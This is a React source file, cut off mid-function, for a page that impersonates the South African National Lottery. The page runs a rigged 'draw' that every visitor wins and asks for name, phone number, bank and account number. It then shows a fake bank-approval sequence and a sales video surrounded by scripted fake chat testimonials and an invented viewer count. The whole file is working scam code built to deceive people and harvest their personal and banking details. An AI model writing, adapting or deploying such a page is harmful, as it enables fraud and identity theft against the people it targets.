import React, { useState, useEffect, useRef } from 'react';
import logo from './assets/lottery-logo.png';

// Global Data
const PRIZES = [
  { rank: "First Prize", label: "R 150,000,000", amount: 15e7, icon: "🥇" },
  { rank: "Second Prize", label: "R 60,000,000", amount: 6e7, icon: "🥈" },
  { rank: "Third Prize", label: "R 30,000,000", amount: 3e7, icon: "🥉" },
  { rank: "Fourth Prize", label: "R 15,000,000", amount: 15e6, icon: "🏆" },
  { rank: "Fifth Prize", label: "R 6,000,000", amount: 6e6, icon: "🎯" }
];

const WINNING_PRIZE = { rank: "Prize Won", label: "R 15,000.00", amount: 15e3, icon: "🏆" };

const BANKS = [
  { name: "ABSA", color: "#e30613", short: "A" },
  { name: "Standard Bank", color: "#003c71", short: "SB" },
  { name: "FNB", color: "#00966b", short: "FNB" },
  { name: "Nedbank", color: "#006341", short: "N" },
  { name: "Capitec", color: "#003c71", short: "C" },
  { name: "Investec", color: "#1a1a1a", short: "I" },
  { name: "African Bank", color: "#003b7a", short: "AB" },
  { name: "TymeBank", color: "#ffc20e", short: "T", textColor: "#0b1b2b" },
  { name: "Discovery Bank", color: "#003c71", short: "D" },
  { name: "Bidvest Bank", color: "#c8102e", short: "B" }
];

const LIVE_CHAT_MESSAGES = [
  { name: "Thandi N.", text: "Just joined!! Is this real? 😱", color: "#e74c3c" },
  { name: "Sipho M.", text: "I received mine last week, R32,500!! Watch the whole video", color: "#3498db" },
  { name: "Zanele D.", text: "This is legit 🔥🔥🔥", color: "#2ecc71" },
  { name: "Mandla N.", text: "My cousin told me about this, she got R45,000", color: "#9b59b6" },
  { name: "Nomsa K.", text: "I'm watching from Soweto, praying this works 🙏", color: "#e67e22" },
  { name: "Bongani S.", text: "Already got my deposit, thank you National Lottery!!", color: "#1abc9c" },
  { name: "Lerato M.", text: "How long does the video take?", color: "#e91e63" },
  { name: "Tshepo R.", text: "Just watch it till the end bro, it explains everything", color: "#00bcd4" },
  { name: "Palesa J.", text: "I can't believe I had unclaimed money 😭😭", color: "#ff5722" },
  { name: "David M.", text: "Watching from Cape Town! Let's gooo 🚀", color: "#4caf50" },
  { name: "Nokuthula Z.", text: "My friend got paid already, I'm next!", color: "#ff9800" },
  { name: "Themba G.", text: "Is it only for South Africa?", color: "#795548" },
  { name: "Ayanda P.", text: "Yes only SA 🇿🇦", color: "#607d8b" },
  { name: "Lindiwe S.", text: "The video is so helpful, keep watching!", color: "#e91e63" },
  { name: "Kabelo T.", text: "R15,000 into my FNB account last Tuesday 🎉", color: "#2196f3" },
  { name: "Ntombi W.", text: "I was skeptical but now I'm a believer 💯", color: "#9c27b0" },
  { name: "Sifiso N.", text: "Who else is watching from Durban? 🙋‍♂️", color: "#ff5722" },
  { name: "Mpho K.", text: "Durban here! 🤙", color: "#4caf50" },
  { name: "Grace O.", text: "This changed my life honestly", color: "#00bcd4" },
  { name: "Lwazi D.", text: "How much did everyone get?", color: "#ff9800" },
  { name: "Sizwe B.", text: "I got R28,000!! Could not believe my eyes", color: "#e74c3c" },
  { name: "Nandi M.", text: "Watching this for the second time, it's that good 😂", color: "#3f51b5" },
  { name: "Johannes V.", text: "My wife didn't believe me until the money hit the account 😂😂", color: "#009688" },
  { name: "Precious M.", text: "Thank you Lord 🙏🙏🙏", color: "#e91e63" },
  { name: "Thabiso L.", text: "Everyone needs to see this video", color: "#795548" },
  { name: "Busisiwe H.", text: "Is the deposit automatic?", color: "#607d8b" },
  { name: "Vusi K.", text: "Yes just watch the video it tells you exactly what to do", color: "#2196f3" },
  { name: "Fikile N.", text: "I'm shaking right now 😳", color: "#9c27b0" },
  { name: "Andile Z.", text: "Stay calm and watch till the end 👌", color: "#4caf50" },
  { name: "Zanele M.", text: "Joburg gang watching 🏙️", color: "#ff5722" },
  { name: "Thabo K.", text: "This is the best thing that happened to me this year", color: "#00bcd4" },
  { name: "Nomvula P.", text: "Shared this with my whole family group chat 📱", color: "#ff9800" },
  { name: "Kagiso R.", text: "R51,000 just like that... still in shock", color: "#e74c3c" },
  { name: "Dineo S.", text: "For real?? 😱😱", color: "#3498db" },
  { name: "Kagiso R.", text: "Dead serious, check your lottery account", color: "#e74c3c" },
  { name: "Sbusiso M.", text: "Don't skip the video, every second matters!", color: "#2ecc71" },
  { name: "Thandiwe L.", text: "I used Capitec and it worked perfectly", color: "#9b59b6" },
  { name: "Xolani D.", text: "FNB also works, just got confirmed ✅", color: "#e67e22" },
  { name: "Noluthando B.", text: "The process was so easy honestly", color: "#1abc9c" },
  { name: "Mthunzi J.", text: "How many people are watching this right now? 😂", color: "#e91e63" },
  { name: "Zodwa A.", text: "Thousands!! Look at the viewer count lol", color: "#00bcd4" },
  { name: "Simphiwe G.", text: "Best decision I made was watching this video 💪", color: "#ff5722" },
  { name: "Nonhlanhla T.", text: "My mother is going to cry when she sees this money 😭❤️", color: "#4caf50" },
  { name: "Bheki W.", text: "Facts!! I paid off my car loan with my winnings", color: "#ff9800" },
  { name: "Lesley F.", text: "ABSA came through fast 🏦", color: "#795548" },
  { name: "Pinky M.", text: "Anyone from Pretoria watching? 🙌", color: "#607d8b" },
  { name: "Dumisani C.", text: "Pretoria here! Just started the video", color: "#2196f3" },
  { name: "Kholeka N.", text: "Don't leave the page, just keep watching ⏯️", color: "#9c27b0" },
  { name: "Neo P.", text: "I'm telling all my friends about this 📣", color: "#4caf50" },
  { name: "Sibongile R.", text: "This is a blessing from God honestly 🙏", color: "#ff5722" },
  { name: "Tumi H.", text: "Standard Bank processed mine in 24 hours 💨", color: "#00bcd4" },
  { name: "Lebo K.", text: "Who's still watching? 👀", color: "#ff9800" },
  { name: "Anele V.", text: "Still here! Almost done with the video", color: "#e74c3c" },
  { name: "Zinhle W.", text: "This is the real deal 💎💎", color: "#3f51b5" },
  { name: "Blessing O.", text: "I literally screamed when I saw my balance 🤣🤣", color: "#009688" },
  { name: "Sandile M.", text: "Same here!! My neighbors thought something was wrong 😂", color: "#e91e63" },
  { name: "Nosipho D.", text: "Nedbank worked for me, just follow the steps", color: "#795548" },
  { name: "Luthando S.", text: "Can't wait to tell my boss I'm taking a vacation 😎✈️", color: "#607d8b" },
  { name: "Phindile J.", text: "This video is gold, pay attention everyone!", color: "#2196f3" },
  { name: "Mzwandile T.", text: "Biggest win of my life, R73,000!! 🏆", color: "#9c27b0" },
  { name: "Cynthia N.", text: "Wow congrats!! 🎊🎊", color: "#4caf50" },
  { name: "Thandeka B.", text: "Keep going everyone, it's worth it! 💪🔥", color: "#ff5722" },
];

// Helper components
function Header({ jackpot }) {
  return (
    <header className="w-full">
      <div className="bg-[#0b2a5e] text-white text-[11px] px-4 py-1.5 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <span>📞 0861 101 101</span>
          <span className="hidden sm:inline">✉ info@nationallottery.co.za</span>
        </div>
        <span className="text-[#f4b400] font-semibold hidden sm:inline">Official Licensed National Lottery</span>
      </div>
      <div className="px-4 py-3 flex items-center justify-between gap-3" style={{ background: "linear-gradient(90deg,#0b3a82 0%,#1556b8 60%,#0e8a3a 100%)" }}>
        <div className="flex items-center gap-2 min-w-0">
          <img src={logo} alt="National Lottery" className="h-9 md:h-11 bg-white rounded-md p-1 shrink-0" />
          <div className="text-white font-bold text-sm md:text-lg leading-tight truncate">South African National Lottery</div>
        </div>
        {jackpot && (
          <div className="bg-[#f4b400] text-[#0b1b2b] rounded-md px-3 py-1.5 shadow-md text-right shrink-0">
            <div className="text-[9px] uppercase font-semibold tracking-wide leading-none">🏆 Jackpot Prize</div>
            <div className="text-sm md:text-base font-extrabold leading-tight mt-0.5">{jackpot}</div>
          </div>
        )}
      </div>
      <div className="h-0.5 bg-gradient-to-r from-[#f4b400] via-[#1556b8] to-[#0e8a3a]"></div>
    </header>
  );
}

function AgeVerification({ onConfirm }) {
  return (
    <div className="fixed inset-0 z-[100] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
      <div className="bg-white rounded-xl shadow-2xl max-w-sm w-full p-6 text-center animate-in fade-in zoom-in duration-300">
        <div className="mx-auto w-20 h-20 rounded-full bg-[#e30613] text-white flex items-center justify-center text-2xl font-extrabold border-4 border-[#0b1b2b]">18+</div>
        <h2 className="mt-4 text-lg font-extrabold text-[#0b1b2b]">Age Verification</h2>
        <p className="text-xs text-[#3a4756] mt-2">
          This site is restricted to adults. By continuing, you confirm that you are <b>18 years of age or older</b> and legally allowed to participate in lottery activities in your country.
        </p>
        <p className="text-[10px] text-[#6b7785] mt-2">Play responsibly. National Responsible Gambling Programme — 0800 006 008.</p>
        <div className="mt-5 flex flex-col gap-2">
          <button onClick={onConfirm} className="w-full bg-[#0e8a3a] hover:bg-[#0a6e2c] text-white font-bold text-sm py-3 rounded-md transition cursor-pointer">✓ I am 18 or older — Enter</button>
          <a href="https://www.google.com" className="w-full bg-gray-200 hover:bg-gray-300 text-[#0b1b2b] font-semibold text-xs py-2.5 rounded-md transition">I am under 18 — Exit</a>
        </div>
      </div>
    </div>
  );
}

function Footer() {
  return (
    <footer className="bg-[#0b2a5e] text-white mt-10 px-4 py-6">
      <div className="max-w-5xl mx-auto grid grid-cols-1 sm:grid-cols-3 gap-4 text-xs">
        <div>
          <p className="font-bold text-sm mb-1">Customer Support</p>
          <p>📞 0861 101 101</p>
        </div>
        <div>
          <p className="font-bold text-sm mb-1">Security</p>
          <p>🛡 Licensed Draws</p>
        </div>
        <div>
          <p className="font-bold text-sm mb-1">About Us</p>
          <p className="text-white/80">Official lottery platform in South Africa. Transparency and security guaranteed.</p>
        </div>
      </div>
    </footer>
  );
}

function BankIcon({ b, size = "md" }) {
  const cn = size === "sm" ? "w-7 h-7 text-[9px]" : "w-9 h-9 text-[10px]";
  return (
    <span className={`${cn} rounded-md flex items-center justify-center font-extrabold shrink-0 shadow-sm`} style={{ background: b.color, color: b.textColor ?? "#fff" }}>
      {b.short}
    </span>
  );
}

function PrizeSelectionStep({ name, phone, setName, setPhone, selected, setSelected, onNext }) {
  const isValid = name.trim().length >= 2 && phone.replace(/\D/g, "").length >= 9 && selected;

  return (
    <main className="max-w-xl mx-auto px-4 py-5">
      <div className="bg-white rounded-lg shadow-md p-5">
        <div className="text-center">
          <span className="inline-block text-[#1d4ea8] text-2xl">🏆</span>
          <h2 className="text-base font-bold text-[#0b1b2b] mt-1">YOU HAVE THE CHANCE TO WIN ONE OF THESE PRIZES</h2>
          <p className="text-xs text-[#3a4756] mt-1">Enter your details and pick the prize you want to win.</p>
        </div>
        <div className="mt-4 grid grid-cols-1 gap-3">
          <div>
            <label className="block text-xs font-semibold text-[#0b1b2b] mb-1">Full name</label>
            <input value={name} onChange={e => setName(e.target.value)} placeholder="e.g. Thabo Mokoena" className="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:border-[#1d4ea8] focus:ring-1 focus:ring-[#1d4ea8] outline-none" />
          </div>
          <div>
            <label className="block text-xs font-semibold text-[#0b1b2b] mb-1">Phone number</label>
            <input value={phone} onChange={e => setPhone(e.target.value)} placeholder="e.g. 071 234 5678" inputMode="tel" className="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:border-[#1d4ea8] focus:ring-1 focus:ring-[#1d4ea8] outline-none" />
          </div>
        </div>
        <p className="text-xs font-semibold text-[#0b1b2b] mt-5 mb-2">Choose your desired prize:</p>
        <div className="space-y-2">
          {PRIZES.map(prize => {
            const isSelected = selected?.rank === prize.rank;
            return (
              <button key={prize.rank} onClick={() => setSelected(prize)} className={`w-full flex items-center justify-between px-3 py-2.5 rounded-md border text-sm transition cursor-pointer ${isSelected ? "bg-[#e8f0ff] border-[#1d4ea8] ring-2 ring-[#1d4ea8]/30" : "bg-[#f6fbff] border-[#d6e4f5] hover:border-[#1d4ea8]"}`}>
                <span className="flex items-center gap-2 text-[#0b1b2b]">
                  <span className="text-lg">{prize.icon}</span>
                  <span className="font-medium">{prize.rank}</span>
                </span>
                <span className="font-bold text-[#0b1b2b]">{prize.label}</span>
              </button>
            );
          })}
        </div>
        <button disabled={!isValid} onClick={onNext} className="mt-5 w-full bg-[#1d4ea8] disabled:bg-gray-300 hover:bg-[#163d82] text-white font-bold text-sm py-3 rounded-md transition flex items-center justify-center gap-2 cursor-pointer disabled:cursor-not-allowed">⭐ ENTER THE DRAW</button>
        <p className="text-[10px] text-[#6b7785] text-center mt-2">🔒 Secure & confidential</p>
      </div>
    </main>
  );
}

function SpinStep({ name, prize, onWin }) {
  const [selectedNumber, setSelectedNumber] = useState(null);
  const [isDrawing, setIsDrawing] = useState(false);
  const [drawnNumbers, setDrawnNumbers] = useState([null, null, null, null, null]);
  const [hasWon, setHasWon] = useState(false);

  function startDraw(number) {
    if (isDrawing || selectedNumber !== null) return;
    setSelectedNumber(number);
    setIsDrawing(true);

    const pool = [3, 7, 12, 19, 24, 31, 38, 42, 47, 9, 15, 22, 28, 36].filter(u => u !== number);
    const shuffled = pool.sort(() => 0.5 - Math.random()).slice(0, 4);
    const finalSequence = [...shuffled, number];

    finalSequence.forEach((val, idx) => {
      setTimeout(() => {
        setDrawnNumbers(prev => {
          const next = [...prev];
          next[idx] = val;
          return next;
        });
        if (idx === finalSequence.length - 1) {
          setTimeout(() => {
            setIsDrawing(false);
            setHasWon(true);
          }, 600);
        }
      }, 1000 + idx * 1100);
    });
  }

  return (
    <main className="max-w-xl mx-auto px-4 py-5">
      <div className="bg-white rounded-lg shadow-md p-4 text-center">
        <p className="text-xs text-[#6b7785]">Hello, <b className="text-[#0b1b2b]">{name.split(" ")[0]}</b></p>
        <h2 className="text-sm font-bold text-[#0b1b2b] mt-1">You are competing for <span className="text-[#1d4ea8]">{prize.rank}</span></h2>
        <p className="text-base font-extrabold text-[#0e8a3a]">{prize.label}</p>
        <p className="text-xs text-[#3a4756] mt-1">
          {selectedNumber === null ? "Pick your lucky number for the official draw:" : isDrawing ? "🎲 Drawing the official lottery numbers..." : "Draw completed!"}
        </p>
        <div className="mt-4 bg-gradient-to-br from-[#0b3a82] to-[#1d4ea8] rounded-lg p-4 shadow-inner">
          <div className="flex items-center justify-between text-white text-[10px] uppercase tracking-wide mb-2">
            <span>🔴 LIVE DRAW</span>
            <span className="font-mono">#{Math.floor(Math.random() * 9000) + 1000}</span>
          </div>
          <div className="flex items-center justify-center gap-2">
            {drawnNumbers.map((num, idx) => {
              const isMatch = hasWon && num === selectedNumber;
              return (
                <div key={idx} className={`w-12 h-12 md:w-14 md:h-14 rounded-full flex items-center justify-center font-extrabold text-lg shadow-lg border-2 transition-all duration-500 ${num === null ? "bg-[#0b1b2b]/40 border-white/20 text-white/30 animate-pulse" : isMatch ? "bg-[#f4b400] border-white text-[#0b1b2b] scale-110" : "bg-white border-white text-[#0b1b2b]"}`}>
                  {num ?? "?"}
                </div>
              );
            })}
          </div>
          {selectedNumber !== null && (
            <p className="text-white/90 text-[11px] mt-3">Your number: <b className="text-[#f4b400]">{selectedNumber}</b></p>
          )}
        </div>
        {selectedNumber === null && (
          <div className="mt-5">
            <p className="text-xs font-semibold text-[#0b1b2b] mb-2">Choose your lucky number:</p>
            <div className="grid grid-cols-5 gap-1.5 max-w-xs mx-auto">
              {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10].map(number => (
                <button key={number} onClick={() => startDraw(number)} className="aspect-square rounded-full font-bold text-sm shadow-sm bg-white hover:bg-[#1d4ea8] hover:text-white text-[#0b1b2b] border border-[#1d4ea8] transition cursor-pointer">
                  {number}
                </button>
              ))}
            </div>
          </div>
        )}
        {hasWon && (
          <div className="mt-5 animate-in fade-in zoom-in duration-500">
            <div className="bg-[#e8f7ee] border border-[#0e8a3a] rounded-md p-4">
              <p className="text-2xl">🎉</p>
              <h3 className="text-base font-extrabold text-[#0e8a3a] mt-1">CONGRATULATIONS!</h3>
              <p className="text-xs text-[#3a4756] mt-1">Your number <b className="text-[#1d4ea8]">{selectedNumber}</b> was drawn! You won the</p>
              <p className="text-sm font-bold text-[#0b1b2b] mt-1">{WINNING_PRIZE.rank}</p>
              <p className="text-2xl font-extrabold text-[#e30613] my-1">{WINNING_PRIZE.label}</p>
              <button onClick={onWin} className="mt-3 w-full bg-[#0e8a3a] hover:bg-[#0a6e2c] text-white font-bold text-sm py-3 rounded-md cursor-pointer transition">CLAIM MY PRIZE →</button>
            </div>
          </div>
        )}
      </div>
    </main>
  );
}

function BankStep({ prize, bank, setBank, accountNumber, setAccountNumber, accountHolder, setAccountHolder, defaultHolder, onSubmit }) {
  useEffect(() => {
    if (!accountHolder) {
      setAccountHolder(defaultHolder);
    }
  }, []);

  const isValid = bank && accountNumber.replace(/\D/g, "").length >= 6 && accountHolder.trim().length >= 2;

  return (
    <main className="max-w-xl mx-auto px-4 py-5">
      <div className="bg-[#0e8a3a] text-white text-center py-2.5 px-4 rounded-t-lg text-sm font-bold">
        💰 PRIZE CONFIRMED: {prize.label}
      </div>
      <div className="bg-white rounded-b-lg shadow-md p-5 border border-[#0e8a3a] border-t-0">
        <h2 className="text-sm font-bold text-[#0b1b2b] text-center">Where should we deposit your winnings?</h2>
        <p className="text-center text-xs text-[#3a4756] mt-1">Select your South African bank and enter your account details.</p>
        <p className="text-xs font-semibold text-[#0b1b2b] mt-4 mb-2">Select your bank:</p>
        <div className="grid grid-cols-2 gap-2">
          {BANKS.map(item => {
            const isSelected = bank === item.name;
            return (
              <button key={item.name} onClick={() => setBank(item.name)} className={`flex items-center gap-2 px-2.5 py-2 rounded-md border text-xs transition cursor-pointer ${isSelected ? "bg-[#e8f0ff] border-[#1d4ea8] ring-2 ring-[#1d4ea8]/30" : "bg-white border-gray-300 hover:border-[#1d4ea8]"}`}>
                <BankIcon b={item} size="sm" />
                <span className="font-semibold text-[#0b1b2b] truncate">{item.name}</span>
              </button>
            );
          })}
        </div>
        <div className="mt-4 space-y-3">
          <div>
            <label className="block text-xs font-semibold text-[#0b1b2b] mb-1">Account holder</label>
            <input value={accountHolder} onChange={e => setAccountHolder(e.target.value)} className="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:border-[#1d4ea8] focus:ring-1 focus:ring-[#1d4ea8] outline-none" />
          </div>
          <div>
            <label className="block text-xs font-semibold text-[#0b1b2b] mb-1">Account number</label>
            <input value={accountNumber} onChange={e => setAccountNumber(e.target.value)} inputMode="numeric" placeholder="e.g. 1234567890" className="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:border-[#1d4ea8] focus:ring-1 focus:ring-[#1d4ea8] outline-none" />
          </div>
          <button disabled={!isValid} onClick={onSubmit} className="w-full bg-[#0e8a3a] disabled:bg-gray-300 hover:bg-[#0a6e2c] text-white font-bold text-sm py-3 rounded-md cursor-pointer disabled:cursor-not-allowed transition">PROCESS MY DEPOSIT →</button>
          <p className="text-[10px] text-[#6b7785] text-center">🔒 Bank-level encryption · SSL secured</p>
        </div>
      </div>
    </main>
  );
}

function ProcessingStep({ bank, onDone }) {
  const [logIndex, setLogIndex] = useState(0);
  const logs = [
    `Connecting to ${bank}...`,
    "Verifying account details...",
    "Validating with SARB...",
    "Preparing transfer..."
  ];

  useEffect(() => {
    if (logIndex < logs.length - 1) {
      const timer = setTimeout(() => setLogIndex(prev => prev + 1), 1100);
      return () => clearTimeout(timer);
    } else {
      const timer = setTimeout(onDone, 1300);
      return () => clearTimeout(timer);
    }
  }, [logIndex]);

  return (
    <main className="max-w-md mx-auto px-4 py-12 text-center">
      <div className="bg-white rounded-lg shadow-md p-6">
        <div className="w-12 h-12 border-4 border-[#1d4ea8] border-t-transparent rounded-full animate-spin mx-auto"></div>
        <h2 className="text-sm font-bold text-[#0b1b2b] mt-4">Processing your deposit...</h2>
        <p className="text-xs text-[#3a4756] mt-1">{logs[logIndex]}</p>
        <div className="mt-4 space-y-1.5 text-left text-xs">
          {logs.slice(0, logIndex + 1).map((log, idx) => (
            <div key={idx} className="flex items-center gap-1.5 text-[#0e8a3a]">
              <span>✓</span>
              <span>{log}</span>
            </div>
          ))}
        </div>
      </div>
    </main>
  );
}

function ApprovedStep({ bank, name, prize, onContinue }) {
  const bankDetails = BANKS.find(b => b.name === bank);
  return (
    <main className="max-w-xl mx-auto px-4 py-5 text-center">
      <div className="bg-white rounded-lg shadow-md p-5 border-t-4 border-[#0e8a3a]">
        <p className="text-3xl">✅</p>
        <h2 className="text-base font-extrabold text-[#0e8a3a] mt-1">BANK APPROVED!</h2>
        <div className="mt-3 flex items-center justify-center gap-2 bg-[#f6fbff] border border-[#d6e4f5] rounded-md p-2 mx-auto max-w-xs">
          {bankDetails && <BankIcon b={bankDetails} size="sm" />}
          <div className="text-left">
            <p className="text-[10px] text-[#6b7785] uppercase font-semibold">Verified</p>
            <p className="text-xs font-bold text-[#0b1b2b]">{bank}</p>
          </div>
        </div>
        <p className="text-xs text-[#3a4756] mt-3">Your account has been verified, <b>{name.split(" ")[0]}</b>.</p>
        <div className="mt-4 bg-[#fffbe6] border border-[#f4b400] rounded-md p-3 text-left">
          <p className="text-xs font-bold text-[#0b1b2b]">⚠️ ONE LAST STEP TO UNLOCK YOUR {prize.label}</p>
          <p className="text-[11px] text-[#3a4756] mt-1.5">For security reasons, watch a quick <b>30-second video</b> to learn how to receive your money <b>instantly</b>. After watching, the transfer will be released to your account.</p>
        </div>
        <button onClick={onContinue} className="mt-4 w-full bg-[#e30613] hover:bg-[#b80510] text-white font-bold text-sm py-3 rounded-md animate-pulse cursor-pointer transition">▶ WATCH VIDEO TO RECEIVE</button>
      </div>
    </main>
  );
}

function LiveChat() {
  const [messages, setMessages] = useState([]);
  const [viewerCount, setViewerCount] = useState(3542);
  const [inputText, setInputText] = useState("");
  const chatRef = useRef(null);
  const msgIndexRef = useRef(0);

  useEffect(() => {
    // Start with 3 initial messages
    const initial = LIVE_CHAT_MESSAGES.slice(0, 3).map((msg, i) => ({
      ...msg,
      id: i,
      timestamp: "agora"
    }));
    setMessages(initial);
    msgIndexRef.current = 3;

    // Add new messages at random intervals
    function scheduleNext() {
      const delay = 2000 + Math.random() * 3000; // 2-5 seconds
      return setTimeout(() => {
        setMessages(prev => {
          const idx = msgIndexRef.current % LIVE_CHAT_MESSAGES.length;
          msgIndexRef.current += 1;
          const newMsg = {
            ...LIVE_CHAT_MESSAGES[idx],
            id: Date.now() + Math.random(),
            timestamp: "agora"
          };
          const updated = [...prev, newMsg];
          if (updated.length > 50) return updated.slice(-50);
          return updated;
        });
        timerRef.current = scheduleNext();
      }, delay);
    }

    const timerRef = { current: null };
    timerRef.current = scheduleNext();

    // Fluctuate viewer count
    const viewerInterval = setInterval(() => {
      setViewerCount(prev => {
        const change = Math.floor(Math.random() * 30) - 12;
        return Math.max(3200, Math.min(4200, prev + change));
      });
    }, 5000);

    return () => {
      if (timerRef.current) clearTimeout(timerRef.current);
      clearInterval(viewerInterval);
    };
  }, []);

  // Auto-scroll to bottom when new messages arrive
  useEffect(() => {
    if (chatRef.current) {
      chatRef.current.scrollTop = chatRef.current.scrollHeight;
    }
  }, [messages]);

  function getInitials(name) {
    return name.split(" ").map(w => w[0]).join("").toUpperCase().slice(0, 2);
  }

  function handleSend() {
    const text = inputText.trim();
    if (!text) return;
    const userMsg = {
      name: "Você",
      text: text,
      color: "#1d4ea8",
      id: Date.now() + Math.random(),
      isUser: true,
      timestamp: "agora"
    };
    setMessages(prev => {
      const updated = [...prev, userMsg];
      if (updated.length > 50) return updated.slice(-50);
      return updated;
    });
    setInputText("");
  }

  function handleKeyDown(e) {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      handleSend();
    }
  }

  return (
    <section className="mt-6">
      {/* Chat Header */}
      <div className="bg-[#0f0f0f] rounded-t-lg px-4 py-2.5 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="inline-flex items-center gap-1.5 text-white text-xs font-bold">
            <span className="relative flex h-2 w-2">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
            </span>
            Chat ao vivo
          </span>
        </div>
        <div className="flex items-center gap-2 text-[11px] text-gray-400">
          <span>👥 {viewerCount.toLocaleString()}</span>
        </div>
      </div>

      {/* Chat Messages Container */}
      <div
        ref={chatRef}
        className="bg-[#181818] overflow-y-auto"
        style={{
          height: "320px",
          scrollBehavior: "smooth"
        }}
      >
        <div className="px-3 py-2 space-y-1">
          {messages.map((msg) => (
            <div
              key={msg.id}
              className={`livechat-msg flex items-start gap-2 py-1.5 px-1 rounded hover:bg-white/5 transition-colors ${msg.isUser ? "bg-white/5" : ""}`}
            >
              {/* Avatar */}
              <div
                className="w-6 h-6 rounded-full flex items-center justify-center text-[9px] font-bold text-white shrink-0 mt-0.5"
                style={{ backgroundColor: msg.color }}
              >
                {msg.isUser ? "👤" : getInitials(msg.name)}
              </div>
              {/* Message Content */}
              <div className="flex-1 min-w-0">
                <span className="text-[11px] leading-relaxed">
                  <span className="font-semibold mr-1.5" style={{ color: msg.isUser ? "#5b9aff" : msg.color }}>{msg.name}</span>
                  <span className="text-gray-300">{msg.text}</span>
                </span>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Chat Input */}
      <div className="bg-[#0f0f0f] rounded-b-lg px-3 py-2.5 flex items-center gap-2 border-t border-white/10">
        <div className="w-6 h-6 rounded-full bg-[#1d4ea8] flex items-center justify-center shrink-0">
          <span className="text-[9px] text-white font-bold">👤</span>
        </div>
        <input
          type="text"
          value={inputText}
          onChange={e => setInputText(e.target.value)}
          onKeyDown={handleKeyDown}
          placeholder="Envie uma mensagem..."
          className="flex-1 bg-[#272727] rounded-full px-3 py-1.5 text-xs text-gray-200 placeholder-gray-500 outline-none border border-transparent focus:border-[#1d4ea8] transition-colors"
        />
        <button
          onClick={handleSend}
          disabled={!inputText.trim()}
          className={`transition-colors ${inputText.trim() ? "text-[#1d4ea8] hover:text-[#5b9aff] cursor-pointer" : "text-gray-600 cursor-not-allowed"}`}
        >
          <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
        </button>
      </div>
    </section>
  );
}


function VslStep({ name, bank, prize }) {
  const playerRef = useRef(null);
  const bankDetails = BANKS.find(b => b.name === bank);

  useEffect(() => {
    if (document.getElementById("vturb-script-6a61e3c4")) return;
    const script = document.createElement("script");
    script.id = "vturb-script-6a61e3c4";
    script.src = "https://scripts.converteai.net/2a4ec53f-c78a-41f7-b67d-8049f514fbb0/players/6a61e3c4f8028b3db4849176/v4/player.js";
    script.async = true;
    document.head.appendChild(script);
  }, []);

  return (
    <main className="max-w-3xl mx-auto px-4 py-5">
      <div className="bg-white rounded-md shadow-sm p-3 border-l-4 border-[#0e8a3a] mb-4 flex items-center gap-3">
        {bankDetails && <BankIcon b={bankDetails} />}
        <div className="grid grid-cols-3 gap-2 text-xs flex-1 min-w-0">
          <div className="min-w-0">
            <p className="text-[#6b7785] text-[10px] uppercase">Name</p>
            <p className="font-bold text-[#0b1b2b] truncate">{name}</p>
          </div>
          <div className="min-w-0">
            <p className="text-[#6b7785] text-[10px] uppercase">Bank</p>
            <p className="font-bold text-[#0b1b2b] truncate">{bank}</p>
          </div>
          <div className="min-w-0">
            <p className="text-[#6b7785] text-[10px] uppercase">Amount</p>
            <p className="font-extrabold text-[#0e8a3a]">{prize.label}</p>
          </div>
        </div>
      </div>
      <h2 className="text-center text-base md:text-xl font-extrabold text-[#0b1b2b] leading-tight">
        WATCH UNTIL THE END TO RELEASE YOUR <span className="text-[#0e8a3a]">{prize.label}</span>
      </h2>
      <p className="text-center text-xs md:text-sm text-[#3a4756] mt-2 max-w-2xl mx-auto">
        <b>{name.split(" ")[0]}</b>, your deposit to <b>{bank}</b> will be released as soon as you finish watching this short video.
      </p>
      <div className="mt-4 rounded-md border border-[#1d4ea8] bg-white shadow-md overflow-hidden">
        <div className="flex items-center justify-between px-3 py-1.5 bg-white border-b text-[11px]">
          <span className="inline-flex items-center gap-1.5 bg-[#e30613] text-white font-bold px-2 py-0.5 rounded-full">
            <span className="w-1.5 h-1.5 rounded-full bg-white animate-pulse"></span> LIVE NOW
          </span>
          <span className="text-[#3a4756] font-semibold">👥 3,542 watching</span>
        </div>
        <div ref={playerRef} className="p-1.5 bg-black">
          <div dangerouslySetInnerHTML={{ __html: '<vturb-smartplayer id="vid-6a61e3c4f8028b3db4849176" style="display: block; margin: 0 auto; width: 100%; "><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 50% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer>' }}></div>
        </div>
      </div>
      <LiveChat />
    </main>
  );
}
// Helper to track Facebook Pixel events
function trackPixelEvent(eventName, params = {}, isCustom = false) {
  if (typeof window !== "undefined" && window.fbq) {
    if (isCustom) {
      window.fbq('trackCustom', eventName, params);
    } else {
      window.fbq('track', eventName, params);
    }
  } else {
    console.log(`[Pixel Event - Mock]: ${eventName}`, params);
  }
}

export default function App() {
  const [step, setStep] = useState("prizes"); // prizes, spin, bank, processing, approved, vsl
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [selectedPrize, setSelectedPrize] = useState(null);
  const [selectedBank, setSelectedBank] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [accountHolder, setAccountHolder] = useState("");
  const [isAgeConfirmed, setIsAgeConfirmed] = useState(false);

  useEffect(() => {
    if (typeof window !== "undefined" && localStorage.getItem("ageConfirmed18") === "1") {
      setIsAgeConfirmed(true);
    }
  }, []);

  useEffect(() => {
    // Track events on step change
    switch (step) {
      case "prizes":
        trackPixelEvent("ViewContent", { content_name: "Lottery Landing Page" });
        break;
      case "spin":
        trackPixelEvent("Lead", { 
          content_name: "Draw Entry",
          value: selectedPrize?.amount || 0,
          currency: "ZAR"
        });
        break;
      case "bank":
        trackPixelEvent("WinPrize", {
